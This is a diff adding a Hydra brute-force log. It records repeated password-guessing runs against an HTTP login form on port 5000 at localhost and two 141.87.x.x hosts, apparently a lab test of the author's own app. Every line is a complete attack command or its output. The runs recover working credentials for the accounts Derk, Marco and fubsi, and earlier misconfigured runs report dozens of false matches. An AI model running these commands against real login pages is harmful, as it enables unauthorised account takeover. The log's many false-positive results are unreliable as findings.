@@ -1,0 +1,207 @@
+# Hydra v9.2 run at 2025-05-06 10:13:34 on localhost:5000 http-post-form (hydra -l Marco -P passwd.txt -t 4 -w 30 -o hydra-http-post-attack.txt localhost:5000 http-post-form /login:Username=^USER^&Password=^PASS^:Bad login)
+# Hydra v9.2 run at 2025-05-06 10:14:04 on 141.87.56.33:5000 http-post-form (hydra -l Marco -P passwd.txt -t 4 -w 30 -o hydra-http-post-attack.txt 141.87.56.33:5000 http-post-form /login:Username=^USER^&Password=^PASS^:Bad login)
+# Hydra v9.2 run at 2025-05-06 10:14:14 on 141.87.56.33 http-post-form (hydra -l Marco -P passwd.txt -t 4 -w 30 -o hydra-http-post-attack.txt 141.87.56.33 http-post-form /login:Username=^USER^&Password=^PASS^:Bad login)
+# Hydra v9.2 run at 2025-05-06 10:15:42 on 141.87.56.33 http-post-form (hydra -l Marco -P passwd.txt -t 4 -w 30 -o hydra-http-post-attack.txt 141.87.56.33 http-post-form /login:Username=^USER^&Password=^PASS^:Bad login)
+# Hydra v9.2 run at 2025-05-06 10:16:59 on 141.87.56.33 http-post-form (hydra -l Marco -P passwd.txt -s 5000 -t 4 -w 30 -o hydra-http-post-attack.txt 141.87.56.33 http-post-form /login:Username=^USER^&Password=^PASS^:Bad login)
+[5000][http-post-form] host: 141.87.56.33   login: Marco   password: 123456
+[5000][http-post-form] host: 141.87.56.33   login: Marco   password: password
+[5000][http-post-form] host: 141.87.56.33   login: Marco   password: 123456789
+[5000][http-post-form] host: 141.87.56.33   login: Marco   password: 12345
+# Hydra v9.2 run at 2025-05-06 10:17:57 on 141.87.56.33 http-post-form (hydra -l Derk -P passwd.txt -s 5000 -t 4 -w 30 -o hydra-http-post-attack.txt 141.87.56.33 http-post-form /login:Username=^USER^&Password=^PASS^:Bad login)
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: 123456
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: 123456789
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: password
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: 12345
+# Hydra v9.2 run at 2025-05-06 10:19:19 on 141.87.56.33 http-post-form (hydra -l Derk -P passwd.txt -s 5000 -t 4 -w 30 -o hydra-http-post-attack.txt 141.87.56.33 http-post-form /login:Username=^USER^&Password=^PASS^:Bad login)
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: 12345
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: password
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: 123456
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: 123456789
+# Hydra v9.2 run at 2025-05-06 10:21:48 on 141.87.56.33 http-post-form (hydra -l Derk -P passwd.txt -s 5000 -t 4 -w 30 -o hydra-http-post-attack.txt 141.87.56.33 http-post-form /login:Username=^USER^&Password=^PASS^::F=mystring)
+# Hydra v9.2 run at 2025-05-06 10:21:58 on 141.87.56.33 http-post-form (hydra -l Derk -P passwd.txt -s 5000 -t 4 -w 30 -o hydra-http-post-attack.txt 141.87.56.33 http-post-form /login:Username=^USER^&Password=^PASS^:F=mystring)
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: 123456789
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: password
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: 123456
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: 12345
+# Hydra v9.2 run at 2025-05-06 10:22:59 on 141.87.56.33 http-post-form (hydra -l Derk -P passwd.txt -s 5000 -t 10 -w 30 -o hydra-http-post-attack.txt 141.87.56.33 http-post-form /login:Username=^USER^&Password=^PASS^:[F|S]=messageshowed)
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: 1234567
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: 12345
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: 123456789
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: password
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: 123456
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: iloveyou
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: rockyou
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: princess
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: 12345678
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: abc123
+# Hydra v9.2 run at 2025-05-06 10:23:26 on 141.87.56.33 http-post-form (hydra -l Derk -P passwd.txt -s 5000 -t 60 -w 30 -o hydra-http-post-attack.txt 141.87.56.33 http-post-form /login:Username=^USER^&Password=^PASS^:[F|S]=messageshowed)
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: password1
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: jennifer
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: nicole
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: ashley
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: princess
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: 111111
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: tigger
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: sunshine
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: loveme
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: jessica
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: 1234567
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: 654321
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: michelle
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: 1234567890
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: daniel
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: iloveu
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: angel
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: secret
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: lovely
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: monkey
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: 123456
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: michael
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: butterfly
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: joshua
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: superman
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: 1234
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: 123456789
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: 12345678
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: qwerty
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: soccer
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: 123123
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: babygirl
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: friends
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: password
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: rockyou
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: anthony
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: purple
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: football
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: hannah
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: andrea
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: chocolate
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: fuckyou
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: bubbles
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: 12345
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: iloveyou
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: abc123
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: 000000
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: carlos
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: justin
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: pass
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: jordan
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: liverpool
+# Hydra v9.2 run at 2025-05-06 10:26:14 on 141.87.56.33 http-post-form (hydra -l Derk -P passwd.txt -s 5000 -t 60 -w 30 -o hydra-http-post-attack.txt 141.87.56.33 http-post-form /login:Username=^USER^&Password=^PASS^:S=Success:C=Derk)
+# Hydra v9.2 run at 2025-05-06 10:26:41 on 141.87.56.33 http-post-form (hydra -l Derk -P passwd.txt -s 5000 -t 60 -w 30 -o hydra-http-post-attack.txt 141.87.56.33 http-post-form /login:Username=^USER^&Password=^PASS^:C=Derk)
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: carlos
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: 123123
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: angel
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: lovely
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: abc123
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: qwerty
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: michael
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: jessica
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: justin
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: ashley
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: rockyou
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: chocolate
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: iloveu
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: 12345
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: anthony
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: soccer
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: jordan
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: 123456
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: 123456789
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: butterfly
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: purple
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: loveme
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: bubbles
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: hannah
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: babygirl
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: 111111
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: sunshine
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: friends
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: 1234567890
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: daniel
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: monkey
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: tigger
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: superman
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: joshua
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: princess
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: 1234567
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: michelle
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: password1
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: football
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: 1234
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: 12345678
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: jennifer
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: secret
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: liverpool
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: iloveyou
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: fuckyou
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: andrea
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: password
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: 654321
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: 000000
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: nicole
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: pass
+# Hydra v9.2 run at 2025-05-06 10:26:53 on 141.87.56.33 http-post-form (hydra -l Derk -P passwd.txt -s 5000 -t 60 -w 30 -o hydra-http-post-attack.txt 141.87.56.33 http-post-form /login:Username=^USER^&Password=^PASS^:S:C=Derk)
+# Hydra v9.2 run at 2025-05-06 10:27:51 on 141.87.56.33 http-post-form (hydra -l Derk -P passwd.txt -s 5000 -t 60 -w 30 -o hydra-http-post-attack.txt 141.87.56.33 http-post-form /login:Username=^USER^&Password=^PASS^:F=user not found:C=Derk)
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: iloveyou
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: babygirl
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: ashley
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: password1
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: 12345
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: 654321
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: 1234567
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: daniel
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: jennifer
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: princess
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: michelle
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: jordan
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: nicole
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: michael
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: 123456789
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: iloveu
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: butterfly
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: 123123
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: justin
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: password
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: 1234567890
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: qwerty
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: friends
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: carlos
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: anthony
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: rockyou
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: monkey
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: lovely
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: tigger
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: angel
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: andrea
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: joshua
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: hannah
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: 1234
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: 12345678
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: jessica
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: chocolate
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: loveme
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: 000000
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: bubbles
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: purple
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: fuckyou
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: abc123
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: soccer
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: liverpool
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: secret
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: superman
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: 123456
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: football
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: sunshine
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: pass
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: 111111
+# Hydra v9.2 run at 2025-05-06 10:28:49 on 141.87.56.33 http-post-form (hydra -l Derk -P passwd.txt -s 5000 -t 60 -w 30 -o hydra-http-post-attack.txt 141.87.56.33 http-post-form /login:Username=^USER^&Password=^PASS^:S=302:C=Derk)
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: pass
+# Hydra v9.2 run at 2025-05-06 10:29:08 on 141.87.56.33 http-post-form (hydra -l Derk -P passwd.txt -s 5000 -t 60 -w 30 -o hydra-http-post-attack.txt 141.87.56.33 http-post-form /login:Username=^USER^&Password=^PASS^:S=302)
+[5000][http-post-form] host: 141.87.56.33   login: Derk   password: pass
+# Hydra v9.2 run at 2025-05-06 10:29:19 on 141.87.56.33 http-post-form (hydra -l Marco -P passwd.txt -s 5000 -t 60 -w 30 -o hydra-http-post-attack.txt 141.87.56.33 http-post-form /login:Username=^USER^&Password=^PASS^:S=302)
+[5000][http-post-form] host: 141.87.56.33   login: Marco   password: 1234
+# Hydra v9.2 run at 2025-05-13 08:14:37 on 141.87.60.79 http-post-form (hydra -l fubsi -P passwd.txt -s 5000 -t 60 -w 30 -o hydra-http-post-attack.txt 141.87.60.79 http-post-form /login:username=^USER^&password=^PASS^:S=302)
+[5000][http-post-form] host: 141.87.60.79   login: fubsi   password: 1234
+# Hydra v9.2 run at 2025-05-13 08:16:00 on 141.87.60.79 http-post-form (hydra -l fubsi -P passwd.txt -s 5000 -t 60 -w 30 -o hydra-http-post-attack.txt 141.87.60.79 http-post-form /login:username=^USER^&password=^PASS^:S=302)
+[5000][http-post-form] host: 141.87.60.79   login: fubsi   password: 1234
